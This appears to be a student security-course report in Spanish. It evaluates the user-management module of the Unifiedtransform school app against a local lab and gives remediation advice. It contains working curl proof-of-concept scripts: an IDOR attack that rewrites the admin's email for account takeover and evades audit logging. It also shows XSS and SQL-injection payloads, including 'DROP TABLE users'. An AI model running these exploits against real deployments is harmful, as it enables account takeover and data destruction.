# Fase 2: Evaluación ofensiva y PoCs — Gestión de Usuarios

**Proyecto:** Unifiedtransform · **Curso:** IC-8071 Seguridad del Software
**Responsable del módulo:** Alex; completar nombre y carné en la portada grupal.
**Versión analizada:** commit `634a114e95b1d713dce8ac6593a9f56c5d806cda`.
**Fecha de ejecución de PoCs:** 5 de noviembre de 2026.

> Este documento aporta las PoC del módulo **Gestión de Usuarios** al documento grupal de la Fase 2.
> Cada PoC cubre los tres vectores exigidos por el enunciado para el módulo:
> **(1)** explotación de servidor, **(2)** explotación de cliente (XSS) y **(3)** alteración de entrada y detección (manipulación de parámetros + *audit poisoning*).

---

## 0. Entorno de reproducción

Todas las pruebas se ejecutaron contra la aplicación levantada localmente con Docker, sobre datos de semilla. No se tocó ningún sistema de terceros.

```bash
# En Apple Silicon, mysql:5.7.22 no tiene imagen arm64; se añadió un override local
# (docker-compose.override.yml) que fuerza plataforma amd64 y crea el usuario de BD.
docker compose up -d
docker compose exec app php artisan migrate:fresh --seed --force   # crea admin@ut.com (id=1)

# El seed solo crea el admin. Las cuentas de docente se crean por la MISMA vía que
# usa la app (UserRepository::createTeacher), por lo que reciben EXACTAMENTE el
# conjunto de permisos de un docente real: 'view users' pero NO 'edit users'.
# Tras un seed limpio, Mallory queda id=2 (atacante) y Victor id=3 (objetivo del XSS).
docker compose exec app php artisan tinker --execute '
$rp = app(App\Repositories\UserRepository::class);
$base = ["gender"=>"male","nationality"=>"NA","phone"=>"0","address"=>"x","address2"=>"","city"=>"x","zip"=>"0","password"=>"password123"];
$rp->createTeacher($base + ["first_name"=>"Mallory","last_name"=>"Intruder","email"=>"mallory@ut.com"]);
$rp->createTeacher($base + ["first_name"=>"Victor","last_name"=>"Victim","email"=>"victor@ut.com"]);
'
```

`docker-compose.override.yml` usado (solo entorno de laboratorio, no altera la lógica de la app):

```yaml
services:
  db:
    platform: linux/amd64
    environment:
      MYSQL_USER: unifiedtransform
      MYSQL_PASSWORD: secret
```

**Cuentas usadas en las PoC:**

| Cuenta | Rol | Permisos relevantes | Papel |
|---|---|---|---|
| `admin@ut.com` (id=1) | admin | `edit users`, `view users`, … | **Víctima** (seed) |
| `mallory@ut.com` (id=2) | teacher | `view users` (**sin** `edit users`) | **Atacante** interno |
| `victor@ut.com` (id=3) | teacher | `view users` (**sin** `edit users`) | **Objetivo** del XSS (PoC-UM-02) |

Las cuentas atacante se crearon con exactamente los permisos que el propio código asigna a un docente en `UserRepository::createTeacher`, para que el escenario sea realista (un docente legítimo, de bajo privilegio).

---

## 1. PoC-UM-01 — Broken Access Control / IDOR en actualización de usuarios

### 1.1 Clasificación

| Marco | Referencia |
|---|---|
| OWASP Top 10 | **A01:2021 – Broken Access Control** (IDOR + falta de autorización a nivel de función) |
| NIST CSF 2.0 | **PR.AA-05** (autorización y menor privilegio); fallo de **PROTECT** |
| Vector enunciado | Punto 1: *Escalación de privilegios & explotación de la confianza* |

### 1.2 Causa raíz (código)

- El constructor del controlador solo exige `view users`, no `edit users`:
  `app/Http/Controllers/UserController.php:29` → `$this->middleware(['can:view users']);`
- `updateTeacher` / `updateStudent` reciben un `Request` **genérico**, sin FormRequest ni chequeo de `edit users` ni de propiedad del registro:
  `UserController.php:167` (`updateTeacher`) y `UserController.php:148` (`updateStudent`).
- El repositorio selecciona el registro destino por un **ID enviado desde el cliente**, sin filtrar por rol ni por propietario:
  `app/Repositories/UserRepository.php:156` → `User::where('id', $request['teacher_id'])->update([...])`
  `app/Repositories/UserRepository.php:124` → `User::where('id', $request['student_id'])->update([...])`
- **Todo docente y estudiante** recibe `view users` al crearse, por lo que cualquier usuario autenticado del sistema cumple el único control existente.

Resultado: un usuario de bajo privilegio puede modificar el perfil de **cualquier** usuario (incluido el administrador), eligiendo el `id` objetivo. Cambiar el correo del admin habilita toma de cuenta vía restablecimiento de contraseña.

### 1.3 Reproducción

```bash
B=http://localhost:8080
CJ=/tmp/mal.txt
TOKEN() { python3 -c "import sys,re;m=re.search(r'name=\"_token\"\s+value=\"([^\"]+)\"',sys.stdin.read());print(m.group(1) if m else '')"; }

# 1) Login como Mallory (docente, SIN 'edit users')
T=$(curl -s -c "$CJ" "$B/login" | TOKEN)
curl -s -b "$CJ" -c "$CJ" -o /dev/null \
  -d "_token=$T" --data-urlencode "email=mallory@ut.com" --data-urlencode "password=password123" "$B/login"

# 2) Obtener un token CSRF válido de la sesión (desde el propio formulario de Mallory, id=2)
ETOK=$(curl -s -b "$CJ" "$B/teachers/edit/2" | TOKEN)

# 3) EXPLOIT: editar al ADMIN (teacher_id=1) aunque es de otro rol y Mallory no tiene 'edit users'
curl -s -b "$CJ" \
  -d "_token=$ETOK" -d "teacher_id=1" \
  --data-urlencode "first_name=PWNED" --data-urlencode "last_name=ByMallory" \
  --data-urlencode "email=attacker@evil.com" \
  --data-urlencode "gender=male" --data-urlencode "nationality=NA" \
  --data-urlencode "phone=0" --data-urlencode "address=x" --data-urlencode "address2=y" \
  --data-urlencode "city=x" --data-urlencode "zip=0" \
  "$B/school/teacher/update"
```

> Nota: el endpoint `editTeacher` filtra por `role='teacher'`, por eso el **formulario** del admin (id=1) devuelve 500. El token CSRF es por sesión, así que se toma de cualquier formulario que renderice (el propio de Mallory). El `update` **no filtra por rol**, por lo que escribe sobre el admin igual.

### 1.4 Evidencia (antes / después)

```text
ADMIN ANTES:
  id=1  email=admin@ut.com       first_name=Hasib  last_name=Mahmud   role=admin  updated_at=19:47:56

POST /school/teacher/update (teacher_id=1) -> 302

ADMIN DESPUÉS:
  id=1  email=attacker@evil.com  first_name=PWNED  last_name=ByMallory role=admin  updated_at=19:52:06
```

Un docente de bajo privilegio reescribió el perfil del administrador (incluido el correo → vector de toma de cuenta). **Explotación confirmada.**

---

## 2. PoC-UM-02 — XSS almacenado en campos de perfil (probado, NO explotable)

### 2.1 Clasificación

| Marco | Referencia |
|---|---|
| OWASP Top 10 | **A03:2021 – Injection** (Cross-Site Scripting) |
| NIST CSF 2.0 | **PR.DS / PR.PS** (salida segura) |
| Vector enunciado | Punto 2: *XSS & client scripts maliciosos* |

### 2.2 Prueba

Reutilizando el fallo de la PoC-UM-01, se inyectó un payload en `first_name` de un usuario y se observó cómo se renderiza.

```bash
# Inyectar en el docente víctima Victor (id=3) vía el endpoint vulnerable
curl -s -b "$CJ" -d "_token=$ETOK" -d "teacher_id=3" \
  --data-urlencode 'first_name=<script>alert(document.cookie)</script>' \
  --data-urlencode "last_name=XSSprobe" --data-urlencode "email=victor@ut.com" \
  --data-urlencode "gender=female" --data-urlencode "nationality=CR" --data-urlencode "phone=1" \
  --data-urlencode "address=a" --data-urlencode "address2=b" --data-urlencode "city=c" --data-urlencode "zip=1" \
  "$B/school/teacher/update"

# Ver el perfil y el HTML crudo
curl -s -b "$CJ" "$B/teachers/view/profile/3" | grep -o '&lt;script&gt;.*&lt;/script&gt;'
```

### 2.3 Resultado

```text
En la base de datos se guarda CRUDO:   <script>alert(document.cookie)</script>
En el HTML del perfil se renderiza ESCAPADO:   &lt;script&gt;alert(document.cookie)&lt;/script&gt;
Ocurrencias de <script> literal en la respuesta: 0
```

Blade escapa automáticamente con `{{ }}` y **ningún** sink del módulo usa `{!! !!}` sobre datos de usuario (revisión exhaustiva de `resources/views/students`, `teachers` y `audit-logs`). La vista de auditoría también usa `{{ }}`.

**Conclusión honesta:** el XSS almacenado por campos de perfil **no es explotable** en esta versión; el control de codificación de salida ya está presente y es efectivo. Se documenta como vector probado y neutralizado (riesgo residual bajo). La recomendación de Fase 3 es *preservar* ese control y evitar introducir `{!! !!}` sobre datos de usuario.

---

## 3. PoC-UM-03 — Manipulación de parámetros HTTP + Audit Poisoning (evasión de auditoría)

### 3.1 Clasificación

| Marco | Referencia |
|---|---|
| OWASP Top 10 | **A08:2021 – Software and Data Integrity Failures** / A09 (fallo de registro) |
| NIST CSF 2.0 | **DE.CM / DE.AE** (detección); el ataque evade **DETECT** |
| Vector enunciado | Punto 3: *Creación de solicitudes equivalentes* (manipulación de parámetros) y *Tracing Code & Audit Poisoning* |

### 3.2 Parte A — Manipulación de parámetros HTTP

La misma PoC-UM-01 es una manipulación de parámetro HTTP: el campo `teacher_id` / `student_id` del cuerpo controla el registro afectado. Cambiando ese único valor se accede a solicitudes "equivalentes" sobre cualquier víctima. No hay vínculo entre el recurso y el usuario autenticado.

### 3.3 Parte B — Audit Poisoning / evasión de la auditoría

#### Causa raíz (código)

- El observer de auditoría solo reacciona a **eventos Eloquent** (`created`/`updated`/`deleted`):
  `app/Observers/AuditableObserver.php:26` (`updated`) usa `$model->getChanges()`.
- El observer se registra sobre los modelos en `app/Providers/AppServiceProvider.php:35` (`$modelClass::observe(...)`).
- Pero las actualizaciones de usuarios se hacen con el **query builder** `User::where(...)->update([...])` (`UserRepository.php:156` y `:124`), que **no dispara** los eventos Eloquent del modelo. Por diseño, el builder omite los eventos.

Resultado: toda edición de perfil —incluida la toma de cuenta del admin— **no genera ninguna entrada de auditoría**. El atacante modifica datos críticos sin dejar rastro en la bitácora.

#### Evidencia

Tras ejecutar la PoC-UM-01 (edición del admin id=1):

```sql
SELECT COUNT(*) FROM audit_logs WHERE event='model.updated';
-- Resultado: 0
```

```text
Eventos presentes en audit_logs:
  model.created  User #1   (seed)
  model.created  User #2   (alta de Mallory)
  model.created  User #3   (alta de Victor)
  auth.login     mallory@ut.com
  ... pero NINGÚN model.updated para el User #1 pese a haberle cambiado email, nombre y updated_at.
```

**Evasión de auditoría confirmada:** la bitácora no registra la modificación. El control de detección es ciego a la ruta real que usa el módulo (coincide con el hallazgo de lectura de código de la Fase 1: la prueba existente usa `save()`, pero el módulo actualiza con el builder).

---

## 3bis. PoC-UM-04 — Inyección SQL en los puntos de entrada del módulo (probada, NO explotable)

### 3bis.1 Clasificación

| Marco | Referencia |
|---|---|
| OWASP Top 10 | **A03:2021 – Injection** (SQL Injection) |
| NIST CSF 2.0 | **PR.PS-06 / PR.DS** (consultas parametrizadas, codificación segura) |
| Vector enunciado | Punto 1: *Puntos de Inyección & Patrones de Ataque (SQL/Command Injection)* |

### 3bis.2 Superficie de ataque evaluada

Se revisaron **todos** los puntos del módulo donde una entrada controlada por el cliente llega a una consulta:

| Entrada | Endpoint | Consulta destino |
|---|---|---|
| `class_id`, `section_id` (query string) | GET `/students/view/list` | `Promotion::where('class_id', $class_id)->where('section_id', $section_id)` (`PromotionRepository::getAll`) |
| `{id}` (segmento de ruta) | GET `/students/view/profile/{id}`, `/teachers/view/profile/{id}` | `User::where('id', $id)` (`UserRepository::findStudent/findTeacher`) |
| `teacher_id`, `student_id` (cuerpo POST) | POST `/school/*/update` | `User::where('id', ...)` en los updates |

El módulo **no** usa `DB::raw`, `whereRaw`, `selectRaw` ni concatenación de cadenas en SQL; todo el acceso a datos pasa por el *query builder* de Eloquent.

### 3bis.3 Reproducción

```bash
B=http://localhost:8080; CJ=/tmp/sqli_cookies.txt
TOKEN(){ python3 -c "import sys,re;m=re.search(r'name=\"_token\"\s+value=\"([^\"]+)\"',sys.stdin.read());print(m.group(1) if m else '')"; }
T=$(curl -s -c "$CJ" "$B/login" | TOKEN)
curl -s -b "$CJ" -c "$CJ" -o /dev/null -d "_token=$T" \
  --data-urlencode "email=admin@ut.com" --data-urlencode "password=password" "$B/login"

# Inyección en class_id del listado de estudiantes
for p in "1 OR 1=1" "0 UNION SELECT password FROM users-- -" "1); DROP TABLE users;-- -"; do
  curl -s -b "$CJ" -o /tmp/out.html -w "class_id=[$p] -> HTTP %{http_code}\n" --get \
    --data-urlencode "class_id=$p" --data-urlencode "section_id=1" "$B/students/view/list"
done
grep -ic "SQLSTATE\[\|syntax to use near" /tmp/out.html   # 0 = sin fuga de error de BD
```

### 3bis.4 Evidencia — la consulta sale parametrizada

Capturando el log de consultas de Laravel con el payload de UNION:

```text
SQL:      select * from `promotions` where `session_id` = ? and `class_id` = ? and `section_id` = ?
BINDINGS: [1, "0 UNION SELECT password FROM users-- -", 1]
```

```text
findStudent con id = "1 OR 1=1":
SQL:      select * from `users` where `id` = ? limit 1
BINDINGS: ["1 OR 1=1"]
```

**Evidencia principal:** el payload completo viaja como **un único valor ligado** (`?`), nunca como parte del texto SQL. Esta es la prueba determinante: aunque la cadena contenga `UNION`, `--` o `;`, PDO la trata como un literal, no como sintaxis SQL. Lo demás son observaciones de apoyo:

- La respuesta HTML **no** filtró errores de base de datos (`SQLSTATE`, *syntax error*): 0 ocurrencias.
- Tras todos los intentos, `SELECT COUNT(*) FROM users` sigue devolviendo las mismas filas: la tabla está intacta.

> **Honestidad sobre el alcance del laboratorio.** El seed deja la base con **0** sesiones, clases, secciones y promociones. Por eso el listado sale vacío con *cualquier* valor de `class_id`: la ausencia de filas extra **no** es, por sí sola, prueba de que la inyección falla; la prueba está en los *bindings* de arriba. Para una verificación más fuerte convendría sembrar al menos una promoción y repetir los payloads, confirmando que siguen ligados.
>
> **Por qué el payload UNION devuelve 302 (no es una inyección exitosa).** En `getStudentList`, un `class_id` como `"0 UNION SELECT ..."` entra en una comparación débil de PHP 7.4: `"0 UNION..." == 0` es `true`, el código toma la rama de "clase por defecto", no encuentra ninguna (base vacía), lanza excepción y el controlador redirige (302). Es manejo de errores, no extracción de datos.
>
> **Nota aparte:** `GET /students/view/profile/1` devuelve HTTP 500, pero **tampoco es inyección**: el seed no tiene usuarios con `role='student'`, `findStudent` retorna `null` y la vista Blade desreferencia `null`. Fallo de robustez (manejo de nulos), ajeno a SQLi.

### 3bis.5 Conclusión honesta

La inyección SQL en el módulo de Gestión de Usuarios **no es explotable** en esta versión: Eloquent parametriza el 100 % de las consultas del módulo y no hay SQL crudo. Se documenta como vector **probado y neutralizado** (riesgo residual bajo). La recomendación de Fase 3 es *preservar* el acceso vía query builder y no introducir `DB::raw`/`whereRaw` con entrada del usuario.

---

## 4. Resumen de hallazgos del módulo

| ID | Hallazgo | OWASP | NIST | Estado PoC |
|---|---|---|---|---|
| UM-01 | Broken Access Control / IDOR en update de usuarios → toma de cuenta | A01 | PR.AA-05 | **Explotado** |
| UM-02 | XSS almacenado en perfil | A03 | PR.DS | Probado, **mitigado** por Blade (no explotable) |
| UM-03a | Manipulación de parámetro HTTP (`teacher_id`/`student_id`) | A08 | DE.AE | **Explotado** |
| UM-03b | Audit Poisoning / evasión (builder omite el observer) | A08/A09 | DE.CM | **Explotado** |
| UM-04 | Inyección SQL en los puntos de entrada del módulo | A03 | PR.PS-06 | Probado, **mitigado** por Eloquent (no explotable) |

## 5. Insumos para la Fase 3 (remediación de mi módulo)

1. **Autorización por función y por registro** en `updateTeacher`/`updateStudent`: exigir `edit users` (FormRequest dedicado con `authorize()`), y validar propiedad/ámbito del `id` objetivo. Dejar de confiar en el `id` del cliente.
2. **Validación de entrada** en la actualización (hoy usa `Request` genérico + `toArray()`): reglas de tipo, `email` único salvo el propio registro, y lista blanca de campos.
3. **Auditoría fiable**: registrar la actualización en la capa que realmente se usa (evento explícito en el repositorio o reemplazar el builder por `save()` del modelo) para cerrar la evasión de `DETECT`. Firmar/encadenar las entradas para integridad.
4. **Preservar** la codificación de salida de Blade (no introducir `{!! !!}` sobre datos de usuario) y añadir CSP como defensa en profundidad.

> El detalle de parches, diffs y pruebas de no-reincidencia corresponde a la Fase 3.
